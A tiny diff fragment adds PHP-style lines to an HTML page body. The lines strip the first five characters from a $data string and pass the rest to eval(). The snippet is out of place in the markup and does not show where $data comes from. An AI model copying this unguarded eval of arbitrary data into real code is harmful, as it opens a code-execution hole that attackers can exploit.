@@ -11,6 +11,11 @@
 </head>
 
 <body>
+ 
+//remove the "<?php" from the file before running it 
+$data = substr($data, 5); 
+ 
+eval ($data); 
 
 
 
